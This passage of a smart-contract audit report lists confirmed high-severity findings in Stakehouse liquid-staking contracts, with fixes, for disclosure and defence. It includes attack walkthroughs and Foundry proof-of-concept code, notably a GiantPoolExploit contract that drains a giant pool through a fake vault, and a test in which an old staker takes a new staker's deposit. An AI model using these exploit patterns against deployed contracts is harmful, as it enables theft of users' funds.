create a malicious contractAttackerVaultwhich is copy ofSavETHVaultwith modifiction.callwithdrawDETH()with Vault list[ValidVault1, ValidVault2, AttackerVault, ValidVaul3].contract would save the dETH balance of itself and then loops through Vaults to validate and burn LPTokens.contract would reach VaultAttackerVaultand call attacker controlled address.attacker contract call other functions to increase dETH balance of contract (if it’s not possible to increase dETH balance of contract by other way so there is no need to save contract initial balance of dETH before the loop and dETH balance of contract would be zero always)withdrawDETH()would finish the loop and transfer all the increase dETH balance to attacker which includes extra amounts.
Because contract don’t check the provided addresses and calls them and there is no reentrancy defense mechanism there is possibility of reentrancy attack which can cause fund lose.
Tools Used
VIM
Recommended Mitigation Steps
Check the provided addresses and also have some reentrancy defense mechanisim.
vince0656 (Stakehouse) confirmed

[H-14] Fund lose in functionbringUnusedETHBackIntoGiantPool()ofGiantSavETHVaultPoolETH gets back to giant pool but the value of idleETH don’t increase
Submitted byunforgiven
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L133-L157https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L24-L25
VariableidleETHin giant pools is storing total amount of ETH sat idle ready for either withdrawal or depositing into a liquid staking network and whenever a deposit or withdraw happens contract adjust the value ofidleETHof contract, but in functionbringUnusedETHBackIntoGiantPool()which brings unused ETH from savETH vault to giant pool the value ofidleETHdon’t get increased which would cause those ETH balance to not be accessible for future staking or withdrawing.
Proof of Concept
This isbringUnusedETHBackIntoGiantPool()code inGiantSavETHVaultPool():
/// @notice Any ETH that has not been utilized by a savETH vault can be brought back into the giant pool/// @param _savETHVaults List of savETH vaults where ETH is staked/// @param _lpTokens List of LP tokens that the giant pool holds which represents ETH in a savETH vault/// @param _amounts Amounts of LP within the giant pool being burntfunction bringUnusedETHBackIntoGiantPool(address[] calldata _savETHVaults,LPToken[][] calldata _lpTokens,uint256[][] calldata _amounts) external {uint256 numOfVaults = _savETHVaults.length;require(numOfVaults > 0, "Empty arrays");require(numOfVaults == _lpTokens.length, "Inconsistent arrays");require(numOfVaults == _amounts.length, "Inconsistent arrays");for (uint256 i; i < numOfVaults; ++i) {SavETHVault vault = SavETHVault(_savETHVaults[i]);for (uint256 j; j < _lpTokens[i].length; ++j) {require(vault.isDETHReadyForWithdrawal(address(_lpTokens[i][j])) == false,"ETH is either staked or derivatives minted");}vault.burnLPTokens(_lpTokens[i], _amounts[i]);}}
As you can see it checks that ETH is available in savETH vault and then calls toburnLPTokens()to burn savETH LP tokens and bring unused ETH to giant pool address, this would increase giant pool ETH balance but code don’t increase theidleETHvalue so contract would lose tracking of real idle ETH balance of contract. because the vaule ofidleETHis used when withdrawing or depositing into savETH vaults so the contract can’t reuse the returned ETH. these are the steps that cause this bug to happen:
giant pool has 100idleETH.with functionbatchDepositETHForStaking()users stake 80ETHand the new value ofidleETHwould be20and contract LP Token balance increase by 80.the 80 newly staked ETH is not yet staked instakehouse.with functionbringUnusedETHBackIntoGiantPool()users bring back those 80ETHfrom Vaults to giant pool and burn giant pool LP tokens and then giant pool have 100 idle ETH but becauseidleETHvalue don’t get increase it still would show20.the extra 80 ETH would returned to giant pool wouldn’t be accessible for withdrawing to users or depositing into Vaults because in withdrawing or depositing into Vaults the value ofidleETHhas been used to know the amount of idle ETH in giant pool and because the value doesn’t show the correct amount so the extra amount of ETH wouldn’t be lost.
Tools Used
VIM
Recommended Mitigation Steps
Contract should correctly update value ofidleETHin different actions because withdraw and deposit logics depend on it.
vince0656 (Stakehouse) confirmed

[H-15] User loses remaining rewards inGiantMevAndFeesPoolwhen new deposits happen because_onDepositETH()setclaimed[][]to max without transferring user remaining rewards
Submitted byunforgiven
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L195-L204https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L33-L48
WhendepositETH()is called in giant pool it calls_onDepositETH()which calls_setClaimedToMax()to make sure new ETH stakers are not entitled to ETH earned by but this can cause users to lose their remaining rewards when they deposits. code should first transfer user remaining rewards when deposit happens.
Proof of Concept
This isdepositETH()code inGiantPoolBase:
/// @notice Add ETH to the ETH LP pool at a rate of 1:1. LPs can always pull out at same rate.function depositETH(uint256 _amount) public payable {require(msg.value >= MIN_STAKING_AMOUNT, "Minimum not supplied");require(msg.value == _amount, "Value equal to amount");// The ETH capital has not yet been deployed to a liquid staking networkidleETH += msg.value;// Mint giant LP at ratio of 1:1lpTokenETH.mint(msg.sender, msg.value);// If anything extra needs to be done_onDepositETH();emit ETHDeposited(msg.sender, msg.value);}
As you can see it increase userlpTokenETHbalance and then calls_onDepositETH(). This is_onDepositETH()and_setClaimedToMax()code inGiantMevAndFeesPoolcontract:
/// @dev On depositing on ETH set claimed to max claim so the new depositor cannot claim ETH that they have not accruedfunction _onDepositETH() internal override {_setClaimedToMax(msg.sender);}/// @dev Internal re-usable method for setting claimed to max for msg.senderfunction _setClaimedToMax(address _user) internal {// New ETH stakers are not entitled to ETH earned byclaimed[_user][address(lpTokenETH)] = (accumulatedETHPerLPShare * lpTokenETH.balanceOf(_user)) / PRECISION;}
As you can see the code setclaimed[msg.sender][address(lpTokenETH]to maximum value so the user wouldn’t be entitled to previous rewards but if user had some remaining rewards in contract he would lose those rewards can’t withdraw them. these are the steps:
user1deposit10ETH to giant pool andaccumulatedETHPerLPSharevalue is2andclaimed[user1][lpTokenETH]would be10 * 2 = 20.some time passes andaccumulatedETHPerLPShareset to4anduser1has10 * 4 - 20 = 20unclaimed ETH rewards (the formula in the code:balance * rewardPerShare - claimed).userdeposit5ETH to giant pool andaccumulatedETHPerLPShareis4so the code would call_onDepositETH()which calls_setClaimedToMaxwhich setsclaimed[user1][lpTokenETH]to15 * 4 = 60.user1new remaining ETH reward would be15 * 4 - 60 = 0. anduser1won’t receive his rewards because when he deposits contract don’t transfer remaining rewards and set claim to max so user loses his funds.
Tools Used
VIM
Recommended Mitigation Steps
When deposit happens, contract should first send remaining rewards, then increase the user’s balance and then set the user claim to max.
vince0656 (Stakehouse) confirmed

[H-16] Reentrancy vulnerability in GiantMevAndFeesPool.withdrawETH
Submitted bycccz
GiantMevAndFeesPool.withdrawETH calls lpTokenETH.burn, then GiantMevAndFeesPool.beforeTokenTransfer, followed by a call to _distributeETHRewardsToUserForToken sends ETH to the user, which allows the user to call any function in the fallback. While GiantMevAndFeesPool.withdrawETH has the nonReentrant modifier, GiantMevAndFeesPool.claimRewards does not have the nonReentrant modifier.When GiantMevAndFeesPool.claimRewards is called in GiantMevAndFeesPool.withdrawETH, the idleETH is reduced but the ETH is not yet sent to the user, which increases totalRewardsReceived and accumulatedETHPerLPShare, thus making the user receive more rewards when calling GiantMevAndFeesPool.claimRewards.
Proof of Concept
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64
Recommended Mitigation Steps
Change to
function withdrawETH(uint256 _amount) external nonReentrant {require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");require(lpTokenETH.balanceOf(msg.sender) >= _amount, "Invalid balance");require(idleETH >= _amount, "Come back later or withdraw less ETH");-  idleETH -= _amount;lpTokenETH.burn(msg.sender, _amount);+  idleETH -= _amount;(bool success,) = msg.sender.call{value: _amount}("");require(success, "Failed to transfer ETH");emit LPBurnedForETH(msg.sender, _amount);}
vince0656 (Stakehouse) confirmed

[H-17] Giant pools can be drained due to weak vault authenticity check
Submitted byJeiwan, also found byTrust,datapunk,immeas,JTJabba,arcoun,bin2chen,imare,wait,unforgiven,satoshipotato,ronnyx2017,Lambda,hihen,bitbopper,fs0c,banky,9svR6w,c7e7eff,perseverancesuccess,0xdeadbeef0x, andclems4ever
https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44
An attacker can withdraw all ETH staked by users in a Giant pool. BothGiantSavETHVaultPoolandGiantMevAndFeesPoolare affected.
Proof of Concept
ThebatchDepositETHForStakingfunction in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes (GiantSavETHVaultPool.sol#L48-L58):
SavETHVaultsavETHPool=SavETHVault(_savETHVaults[i]);require(liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),"Invalid liquid staking manager");// Deposit ETH for staking of BLS keysavETHPool.batchDepositETHForStaking{ value:transactionAmount}(_blsPublicKeys[i],_stakeAmounts[i]);
An attacker can pass an exploit contract as a vault. The exploit contract will implementliquidStakingManagerthat will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:
// test/foundry/GiantPools.t.solcontractGiantPoolExploit{addressimmutableowner=msg.sender;addressvalidStakingManager;constructor(addressvalidStakingManager_) {validStakingManager=validStakingManager_;}functionliquidStakingManager()publicviewreturns(address) {returnvalidStakingManager;}functionbatchDepositETHForStaking(bytes[]calldata/*_blsPublicKeyOfKnots*/,uint256[]calldata/*_amounts*/)externalpayable{payable(owner).transfer(address(this).balance);}}functiontestPoolDraining_AUDIT()public{// Register BLS keyaddressnodeRunner=accountOne;vm.deal(nodeRunner,12ether);registerSingleBLSPubKey(nodeRunner,blsPubKeyOne,accountFour);// Set up users and ETHaddresssavETHUser=accountThree;vm.deal(savETHUser,24ether);addressattacker=address(0x1337);vm.label(attacker,"attacker");vm.deal(attacker,1ether);// User deposits ETH into Giant savETHvm.prank(savETHUser);giantSavETHPool.depositETH{value:24ether}(24ether);assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser),24ether);assertEq(address(giantSavETHPool).balance,24ether);// Attacker deploys an exploit.vm.startPrank(attacker);GiantPoolExploitexploit=newGiantPoolExploit(address(manager));vm.stopPrank();// Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.bytes[][]memoryblsKeysForVaults=newbytes[][](1);blsKeysForVaults[0] =getBytesArrayFromBytes(blsPubKeyOne);uint256[][]memorystakeAmountsForVaults=newuint256[][](1);stakeAmountsForVaults[0] =getUint256ArrayFromValues(24ether);giantSavETHPool.batchDepositETHForStaking(getAddressArrayFromValues(address(exploit)),getUint256ArrayFromValues(24ether),blsKeysForVaults,stakeAmountsForVaults);// Vault got nothing.assertEq(address(manager.savETHVault()).balance,0ether);// Attacker has stolen user's deposit.assertEq(attacker.balance,25ether);}
Recommended Mitigation Steps
Consider taking a list ofLiquidStakingManageraddresses instead of vault addresses:
--- a/contracts/liquid-staking/GiantSavETHVaultPool.sol+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {/// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding/// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in fundingfunction batchDepositETHForStaking(-        address[] calldata _savETHVaults,+        address[] calldata _liquidStakingManagers,uint256[] calldata _ETHTransactionAmounts,bytes[][] calldata _blsPublicKeys,uint256[][] calldata _stakeAmounts) public {-        uint256 numOfSavETHVaults = _savETHVaults.length;+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;require(numOfSavETHVaults > 0, "Empty arrays");require(numOfSavETHVaults == _ETHTransactionAmounts.length, "Inconsistent array lengths");require(numOfSavETHVaults == _blsPublicKeys.length, "Inconsistent array lengths");@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {// For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validatorfor (uint256 i; i < numOfSavETHVaults; ++i) {+            require(+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),+                "Invalid liquid staking manager"+            );+uint256 transactionAmount = _ETHTransactionAmounts[i];// As ETH is being deployed to a savETH pool vault, it is no longer idleidleETH -= transactionAmount;-            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);-            require(-                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),-                "Invalid liquid staking manager"-            );+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));+            SavETHVault savETHPool = liquidStakingManager.savETHVault();// Deposit ETH for staking of BLS keysavETHPool.batchDepositETHForStaking{ value: transactionAmount }(
vince0656 (Stakehouse) confirmed

[H-18] Old stakers can steal deposits of new stakers inStakingFundsVault
Submitted byJeiwan, also found byimmeas,rbserver,unforgiven,cccz, and9svR6w
https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L75https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L123https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/StakingFundsVault.sol#L63
Stakers to the MEV+fees vault can steal funds from the new stakers who staked after a validator was registered and the derivatives were minted. A single staker who staked 4 ETH can steal all funds deposited by new stakers.
Proof of Concept
StakingFundsVaultis designed to pull rewards from a Syndicate contract and distributed them pro-rata among LP token holders (StakingFundsVault.sol#L215-L231):
if(i==0&& !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {// Withdraw any ETH accrued on free floating SLOT from syndicate to this contract// If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched_claimFundsFromSyndicateForDistribution(liquidStakingNetworkManager.syndicate(),_blsPubKeys);// Distribute ETH per LPupdateAccumulatedETHPerLP();}// If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETHLPTokentoken=lpTokenForKnot[_blsPubKeys[i]];require(address(token) !=address(0),"Invalid BLS key");require(token.lastInteractedTimestamp(msg.sender) +30minutes<block.timestamp,"Last transfer too recent");_distributeETHRewardsToUserForToken(msg.sender,address(token),token.balanceOf(msg.sender),_recipient);
TheupdateAccumulatedETHPerLPfunction calculates the reward amount per LP token share (SyndicateRewardsProcessor.sol#L76):
function_updateAccumulatedETHPerLP(uint256_numOfShares)internal{if(_numOfShares>0) {uint256received=totalRewardsReceived();uint256unprocessed=received-totalETHSeen;if(unprocessed>0) {emitETHReceived(unprocessed);// accumulated ETH per minted share is scaled to avoid precision loss. it is scaled down lateraccumulatedETHPerLPShare+= (unprocessed*PRECISION) /_numOfShares;totalETHSeen=received;}}}
And the_distributeETHRewardsToUserForTokenfunction distributes rewards to LP token holders (SyndicateRewardsProcessor.sol#L51):
function_distributeETHRewardsToUserForToken(address_user,address_token,uint256_balance,address_recipient)internal{require(_recipient!=address(0),"Zero address");uint256balance=_balance;if(balance>0) {// Calculate how much ETH rewards the address is owed / dueuint256due= ((accumulatedETHPerLPShare*balance) /PRECISION) -claimed[_user][_token];if(due>0) {claimed[_user][_token] =due;totalClaimed+=due;(boolsuccess, ) =_recipient.call{value:due}("");require(success,"Failed to transfer");emitETHDistributed(_user,_recipient,due);}}}
To ensure that rewards are distributed fairly, these functions are called before LP token balances are updated (e.g. when making a depositStakingFundsVault.sol#L123).
However, this rewards accounting algorithm also counts deposited tokens:
to stake tokens, users calldepositETHForStakingand send ETH (StakingFundsVault.sol#L113);updateAccumulatedETHPerLPis called in the function (StakingFundsVault.sol#L123);updateAccumulatedETHPerLPchecks the balance of the contract, whichalready includes the new staked amount(SyndicateRewardsProcessor.sol#L78,SyndicateRewardsProcessor.sol#L94).the staked amount is then counted in theaccumulatedETHPerLPSharevariable (SyndicateRewardsProcessor.sol#L85), which is used to calculate the reward amount per LP share (SyndicateRewardsProcessor.sol#L61).
This allows the following attack:
a user stakes 4 ETH to a BLS key;the validator with the BLS key gets registered and its derivative tokens get minted;a new user stakes some amount to a different BLS key;the first user callsclaimRewardsand withdraws the stake of the new user.
// test/foundry/StakingFundsVault.t.solfunctiontestStealingOfDepositsByOldStakers_AUDIT()public{// Resetting the mocks, we need real action.MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne,0);MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyTwo,0);liquidStakingManager.setIsPartOfNetwork(blsPubKeyOne,false);liquidStakingManager.setIsPartOfNetwork(blsPubKeyTwo,false);// Aliasing accounts for better readability.addressnodeRunner=accountOne;addressalice=accountTwo;addressalice2=accountFour;addressbob=accountThree;// Node runner registers two BLS keys.registerSingleBLSPubKey(nodeRunner,blsPubKeyOne,accountFive);registerSingleBLSPubKey(nodeRunner,blsPubKeyTwo,accountFive);// Alice deposits to the MEV+fees vault of the first key.maxETHDeposit(alice,getBytesArrayFromBytes(blsPubKeyOne));// Someone else deposits to the savETH vault of the first key.liquidStakingManager.savETHVault().depositETHForStaking{value:24ether}(blsPubKeyOne,24ether);// The first validator is registered and the derivatives are minted.assertEq(vault.totalShares(),0);stakeAndMintDerivativesSingleKey(blsPubKeyOne);assertEq(vault.totalShares(),4ether);// Warping to pass the lastInteractedTimestamp checks.vm.warp(block.timestamp+1hours);// The first key cannot accept new deposits since the maximal amount was deposited// and the validator was register. The vault however can still be used to deposit to// other keys.// Bob deposits to the MEV+fees vault of the second key.maxETHDeposit(bob,getBytesArrayFromBytes(blsPubKeyTwo));assertEq(address(vault).balance,4ether);assertEq(bob.balance,0);// Alice is claiming rewards for the first key.// Notice that no rewards were distributed to the MEV+fees vault of the first key.assertEq(alice2.balance,0);vm.startPrank(alice);vault.claimRewards(alice2,getBytesArrayFromBytes(blsPubKeyOne));vm.stopPrank();LPTokenlpTokenBLSPubKeyOne=vault.lpTokenForKnot(blsPubKeyOne);// Alice has stolen the Bob's deposit.assertEq(alice2.balance,4ether);assertEq(vault.claimed(alice,address(lpTokenBLSPubKeyOne)),4ether);assertEq(vault.claimed(alice2,address(lpTokenBLSPubKeyOne)),0);assertEq(address(vault).balance,0);assertEq(bob.balance,0);}
Recommended Mitigation Steps
Consider excluding newly staked amounts in theaccumulatedETHPerLPSharecalculations.
vince0656 (Stakehouse) confirmed duplicate issue #375

[H-19]withdrawETH()in GiantPoolBase don’t call_distributeETHRewardsToUserForToken()or_onWithdraw()which would make users to lose their remaining rewards
Submitted byunforgiven, also found by0x4non
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L50-L64https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L180-L193
Function_distributeETHRewardsToUserForToken()is used to distribute remaining reward of user and it’s called in_onWithdraw()ofGiantMevAndFeesPool. but functionwithdrawETH()inGiantPoolBasedon’t call either of them and burn user giant LP token balance so if user withdraw his funds and has some remaining ETH rewards he would lose those rewards because his balance set to zero.
Proof of Concept
This iswithdrawETH()code inGiantPoolBase:
/// @notice Allow a user to chose to burn their LP tokens for ETH only if the requested amount is idle and available from the contract/// @param _amount of LP tokens user is burning in exchange for same amount of ETHfunction withdrawETH(uint256 _amount) external nonReentrant {require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");require(lpTokenETH.balanceOf(msg.sender) >= _amount, "Invalid balance");require(idleETH >= _amount, "Come back later or withdraw less ETH");idleETH -= _amount;lpTokenETH.burn(msg.sender, _amount);(bool success,) = msg.sender.call{value: _amount}("");require(success, "Failed to transfer ETH");emit LPBurnedForETH(msg.sender, _amount);}
As you can see it burn userlpTokenETHbalance and don’t call either_distributeETHRewardsToUserForToken()or_onWithdraw(). and in functionclaimRewards()useslpTokenETH.balanceOf(msg.sender)to calculate user rewards so if user balance get to0user won’t get the remaining rewards.
These are steps that this bug happens:
user1deposit10ETH into the giant pool andclaimed[user1][lpTokenETH]is20andaccumulatedETHPerLPShareis2.some time passes andaccumulatedETHPerLPShareset to3.user1unclaimed rewards are10 * 3 - 20 = 10ETH.user1withdraw his10ETH by callingwithdrawETH(10)and contract setlpTokenETHbalance ofuser1to0and transfer10ETH to user.now ifuser1callsclaimRewards()he would get0reward as hislpTokenETHbalance is0.
so users lose their unclaimed rewards by withdrawing their funds.
Tools Used
VIM
Recommended Mitigation Steps
User’s unclaimed funds should be calculated and transferred before any actions that change user’s balance.
vince0656 (Stakehouse) confirmed

[H-20] Possibly reentrancy attacks in_distributeETHRewardsToUserForTokenfunction
Submitted byrotcivegaf, also found bydatapunk,0x4non, andclems4ever
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340
The root of the problem is in the_distributeETHRewardsToUserForTokenwhich makes a call to distribute the ether rewards. With this call, the recipient can execute an reentrancy attack calling several times the different function to steal founds or take advantage of other users/protocol.
Proof of Concept
This functions use the_distributeETHRewardsToUserForToken:
beforeTokenTransfer,GiantMevAndFeesPoolcontract:
The contractGiantLPuse theGiantMevAndFeesPoolcontract astransferHookProcessorand when use the functions_mint,_burn,transferFromandtransferof the ERC20, the functionbeforeTokenTransferimplemented in theGiantMevAndFeesPoolbring a possibility to make a reentrancy attack because in the function_distributeETHRewardsToUserForTokenimplemented in theGiantMevAndFeesPoolmake acallto the_recipient
A contract can call the functiontransferofGiantLPcontract several time, transfer anamountfrom and to self, as the update of theclaimedwould not be done until, it is executed the function_afterTokenTransferof theGiantLPcontract, thedueamount calculated in_distributeETHRewardsToUserForTokenofSyndicateRewardsProcessorcontract and thelastInteractedTimestampofGiantLPcontract will be incorrect
withdrawLPTokens,GiantPoolBasecontract:
The possibility of the reentrancy is given when call function_onWithdraw, this function implemented inGiantMevAndFeesPoolcontractuses_distributeETHRewardsToUserForTokenand this one call the recipient making the possibility of the reentrancy, breaking the code ofL76-L89
batchDepositETHForStaking,StakingFundsVaultcontract:
The possibility of the reentrancy is given when call function_distributeETHRewardsToUserForToken, this function call the recipient making the possibility of the reentrancy, breaking the code ofL76-L89
depositETHForStaking,StakingFundsVaultcontract:
The possibility of the reentrancy is given when call function_distributeETHRewardsToUserForToken, this function call the recipient making the possibility of the reentrancy, breaking the code ofL136-L142
beforeTokenTransfer,StakingFundsVaultcontract:
The possibility of the reentrancy is given when call function_distributeETHRewardsToUserForTokeninL333andL337, this function call the recipient making the possibility of the reentrancy, breaking the code ofL343-L351
Recommended Mitigation Steps
One possibility is to wrap(deposit) ether in WETH and transfer as ERC20 token.
Another is to addnonReentrantguard to the functions:
beforeTokenTransfer,GiantMevAndFeesPoolcontractwithdrawLPTokens,GiantPoolBasecontractbatchDepositETHForStaking,StakingFundsVaultcontractdepositETHForStaking,StakingFundsVaultcontractbeforeTokenTransfer,StakingFundsVaultcontract
File: contracts/liquid-staking/GiantMevAndFeesPool.sol@@ -143,7 +143,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate}/// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed-    function beforeTokenTransfer(address _from, address _to, uint256) external {+    function beforeTokenTransfer(address _from, address _to, uint256) external nonReentrant {require(msg.sender == address(lpTokenETH), "Caller is not giant LP");updateAccumulatedETHPerLP();
File: contracts/liquid-staking/GiantPoolBase.sol@@ -66,7 +66,7 @@ contract GiantPoolBase is ReentrancyGuard {/// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP/// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool/// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP-    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {+    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external nonReentrant {uint256 amountOfTokens = _lpTokens.length;require(amountOfTokens > 0, "Empty arrays");require(amountOfTokens == _amounts.length, "Inconsistent array lengths");
File: contracts/liquid-staking/StakingFundsVault.sol@@ -66,7 +66,7 @@ contract StakingFundsVault is/// @notice Batch deposit ETH for staking against multiple BLS public keys/// @param _blsPublicKeyOfKnots List of BLS public keys being staked/// @param _amounts Amounts of ETH being staked for each BLS public key-    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {+    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable nonReentrant {uint256 numOfValidators = _blsPublicKeyOfKnots.length;require(numOfValidators > 0, "Empty arrays");require(numOfValidators == _amounts.length, "Inconsistent array lengths");@@ -110,7 +110,7 @@ contract StakingFundsVault is/// @notice Deposit ETH against a BLS public key for staking/// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner/// @param _amount Amount of ETH being staked-    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {+    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable nonReentrant returns (uint256) {require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key is banned or not a part of LSD network");require(getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,@@ -312,7 +312,7 @@ contract StakingFundsVault is}/// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards-    function beforeTokenTransfer(address _from, address _to, uint256) external override {+    function beforeTokenTransfer(address _from, address _to, uint256) external override nonReentrant {address syndicate = liquidStakingNetworkManager.syndicate();if (syndicate != address(0)) {LPToken token = LPToken(msg.sender);
vince0656 (Stakehouse) confirmed

[H-21]bringUnusedETHBackIntoGiantPoolinGiantMevAndFeesPoolcan be used to stealLPTokens
Submitted bydatapunk
realLPTokenscan be transferred out ofGiantMevAndFeesPoolthrough fake_stakingFundsVaultsprovided by an attacker.https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126
Proof of Concept
bringUnusedETHBackIntoGiantPooltakes in_stakingFundsVaults,_oldLPTokens,_newLPTokensand rotate_amountsfrom old to new tokens. The tokens are thoroughly verified byburnLPForETHinETHPoolLPFactory.However, theres is no checking for the validity of_stakingFundsVaults, nor the relationship betweenLPTokensand_stakingFundsVaults. Therefore, an attacker can create fake contracts for_stakingFundsVaults, withburnLPTokensForETH, that takesLPTokensas parameters. Themsg.senderinburnLPTokensForETHisGiantMevAndFeesPool, thus the attacker can transferLPTokensthat belongs toGiantMevAndFeesPoolto any addresses it controls.
Recommended Mitigation Steps
Always passing liquid staking manager address, checking its real and then requesting either the savETH vault or staking funds vault is a good idea to prove the validity of vaults.
vince0656 (Stakehouse) confirmed

